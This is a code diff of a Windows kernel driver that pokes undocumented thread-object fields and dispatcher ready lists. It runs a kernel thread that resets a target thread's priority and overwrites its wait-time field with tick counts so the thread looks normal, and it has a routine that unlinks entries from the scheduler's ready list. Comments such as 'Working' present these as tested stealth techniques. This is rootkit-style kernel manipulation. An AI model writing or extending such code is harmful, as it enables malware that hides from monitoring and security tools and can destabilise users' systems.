@@ -15,6 +15,9 @@ PLIST_ENTRY RemovedEntryFromList;
 PEPROCESS targetEPROC;
 PETHREAD targetETHRD;
 PETHREAD DummyThreadObject;
+BOOLEAN RunThrd = TRUE;
+PVOID ptThreadObject;
+PETHREAD krnlThrd;
 
 //Alternate way of getting currentprcb
 //FORCEINLINE PLIST_ENTRY GetDispatcherList(VOID)
@@ -36,23 +39,15 @@ static PLIST_ENTRY GetDispatcherListPerProc(int proc)
 	ntQueryPrcb = (KeQueryPrcbAddressFn)MmGetSystemRoutineAddress(&ntQueryPrcbName);
 	return (PLIST_ENTRY)(ntQueryPrcb(proc) + PRCB_DISPATCHERREADYLISTHEAD);
 }
-VOID HigherPriorityDummyThrd(IN PVOID pContext)
-{
-	pContext;
-	LARGE_INTEGER sleepTime;
-	sleepTime.QuadPart = 1;
-	while (TRUE) {
-		KeSetPriorityThread((PKTHREAD)DummyThreadObject, 2);
-		KeDelayExecutionThread(KernelMode, FALSE, &sleepTime);
-	}
-}
+
 VOID ThreadFunc(IN PVOID pContext)
 {
 	pContext;
 	LARGE_INTEGER sleepTime;
 	sleepTime.QuadPart = 1;
-	while (TRUE) {
-		KeSetPriorityThread((PKTHREAD)targetETHRD, 1);
+	while (RunThrd == TRUE) {
+		KeSetPriorityThread((PKTHREAD)targetETHRD, 6);
+
 		//First Combo - Working
 		//*((ULONG*)((BYTE*)targetETHRD + 0x084)) = MAXLONG;
 		//*((ULONG*)((BYTE*)targetETHRD + 0x1b4)) = MAXLONG - 500;
@@ -66,11 +61,12 @@ VOID ThreadFunc(IN PVOID pContext)
 
 		//Normal Looking WaitTime - Working
 		//*((ULONG*)((BYTE*)targetETHRD + 0x1b4)) = 0x4abc;
-		
+
 		//Working with ticks normalized
 		* ((ULONG*)((BYTE*)targetETHRD + 0x1b4)) = *((ULONG*)((BYTE*)KI_USER_SHARED_DATA + 0x320));
 		KeDelayExecutionThread(KernelMode, FALSE, &sleepTime);
 	}
+	PsTerminateSystemThread(STATUS_SUCCESS);
 }
 static BOOLEAN RemoveEntityFromList(PLIST_ENTRY ListHead)
 {
@@ -111,6 +107,13 @@ static BOOLEAN RemoveEntityFromList(PLIST_ENTRY ListHead)
 
 VOID Unload()
 {
+	RunThrd = FALSE;
+	KeWaitForSingleObject(krnlThrd,
+		Executive,
+		KernelMode,
+		FALSE,
+		NULL);
+	ObDereferenceObject(krnlThrd);
 	//InsertTailList(RemovedEntryFromList, RemovedEntry);
 	DbgPrint("Driver Unloaded\n");
 }
@@ -134,6 +137,15 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
 
 	NTSTATUS status = PsCreateSystemThread(&hThread, (ACCESS_MASK)0, NULL, (HANDLE)0, NULL, ThreadFunc,
 		NULL);
+
+	ObReferenceObjectByHandle(hThread,
+		THREAD_ALL_ACCESS,
+		NULL,
+		KernelMode,
+		&krnlThrd,
+		NULL);
+
+	ZwClose(hThread);
 
 	if (!NT_SUCCESS(status))
 		return status;
